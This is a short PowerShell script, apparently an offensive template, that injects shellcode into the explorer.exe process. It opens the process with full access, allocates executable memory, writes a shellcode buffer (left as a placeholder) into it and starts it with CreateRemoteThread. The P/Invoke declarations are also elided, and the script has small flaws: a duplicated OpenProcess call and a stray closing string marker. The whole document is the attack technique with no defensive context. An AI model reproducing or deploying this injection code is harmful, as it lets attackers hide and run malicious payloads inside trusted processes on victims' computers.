$Code=@"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
public class test
{
<p/invoke stuff>
}
"@
Add-Type $Code
$target_pid=(Get-Process -Name explorer | Select-Object -Property Id).Id
[IntPtr]$phandle = [test]::OpenProcess(0x001F0FFF,$FALSE,$target_pid);
[Byte[]] $buf = <shellcode>
[IntPtr]$phandle = [test]::OpenProcess(0x001F0FFF,$FALSE,$target_pid);
[IntPtr]$address = [test]::VirtualAllocEx($phandle,[IntPtr]::Zero,$buf.Count,0x3000,0x40);
[test]::WriteProcessMemory($phandle,$address,$buf,$buf.Count,[IntPtr]::Zero);
[IntPtr]$threadHandle = [test]::CreateRemoteThread($phandle,[IntPtr]::Zero,0,$address,[IntPtr]::Zero,0,[IntPtr]::Zero);
[test]::WaitForSingleObject($threadHandle,[UInt32]"0xFFFFFFFF");
"@
